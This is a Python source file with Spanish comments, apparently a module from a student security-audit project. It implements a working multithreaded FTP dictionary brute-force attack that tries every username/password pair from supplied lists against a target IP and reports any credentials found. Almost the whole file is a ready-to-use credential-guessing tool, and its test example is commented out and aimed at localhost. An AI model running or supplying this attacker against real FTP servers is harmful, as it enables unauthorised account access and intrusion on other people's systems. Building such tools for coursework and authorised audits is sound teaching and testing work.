# Módulo a desarrollar por el Grupo 3 (Fase II: Fuerza Bruta FTP)
import ftplib
import threading
import queue
import logging
import datetime

class FTPBruteForcer:
    def __init__(self, ip_address, max_threads=5):
        self.ip_address = ip_address
        self.max_threads = max_threads
        self.queue = queue.Queue()
        self.found_credentials = []
        self.stop_event = threading.Event()
        self.lock = threading.Lock()

    def _worker(self):
        """Hilo de trabajo que procesa combinaciones (usuario, contraseña) desde la cola."""
        while not self.queue.empty() and not self.stop_event.is_set():
            try:
                user, password = self.queue.get(timeout=1)
                
                ftp = ftplib.FTP()
                try:
                    ftp.connect(self.ip_address, timeout=4)
                    ftp.login(user=user, passwd=password)
                    
                    with self.lock:
                        # Si la ejecución llega a esta línea, la autenticación fue exitosa
                        if not self.stop_event.is_set():
                            self.found_credentials.append({'user': user, 'password': password})
                            print(f"\n[+] ¡ÉXITO FTP! Credenciales encontradas -> {user}:{password}")
                            self.stop_event.set()
                    
                    ftp.quit()
                except ftplib.error_perm:
                    # Código 530 - Autenticación fallida
                    pass
                finally:
                    try:
                        ftp.close()
                    except Exception:
                        pass
                        
            except queue.Empty:
                break
            except Exception as e:
                logging.debug(f"Error general en hilo FTP: {e}")
            finally:
                self.queue.task_done()

    # NOTA SOBRE LOS DICCIONARIOS:
    # ¿De dónde provienen users_list y passwords_list?
    # 1. Durante el desarrollo/pruebas (Grupo 3), pueden definirse estáticamente o leerse de un archivo .txt local de prueba.
    # 2. En la integración final (Semana 7), el orquestador principal (auditoria.py / Grupo 4) será el responsable
    #    de cargar los archivos de diccionarios reales indicados por el usuario y pasar estas listas como parámetros.
    def load_dictionaries(self, users_list, passwords_list):
        """Llena la cola con todas las combinaciones posibles (Producto Cartesiano)."""
        for u in users_list:
            for p in passwords_list:
                self.queue.put((u, p))

    def run(self):
        """Inicia el pool de hilos y orquesta el ataque."""
        print(f"[*] Iniciando ataque de diccionario FTP en {self.ip_address}...")
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
            
        status_final = "success" if self.found_credentials else "failed"
        error_msg = None if self.found_credentials else "Ataque terminado. No se encontraron credenciales."
            
        return {
            "modulo": "Fuerza Bruta FTP",
            "grupo": 3,
            "estudiante": "E3", 
            "target": self.ip_address,
            "timestamp": datetime.datetime.now().isoformat(),
            "status": status_final,
            "data": {
                "credenciales_encontradas": self.found_credentials
            },
            "error_message": error_msg
        }

if __name__ == "__main__":
    # Área de pruebas independiente para el Grupo 3
    print("Módulo de Fuerza Bruta FTP (Plantilla Base).")
    # inst = FTPBruteForcer("127.0.0.1")
    # inst.load_dictionaries(["admin", "root"], ["12345", "admin", "password"])
    # resultados = inst.run()
    # import json
    # print(json.dumps(resultados, indent=4))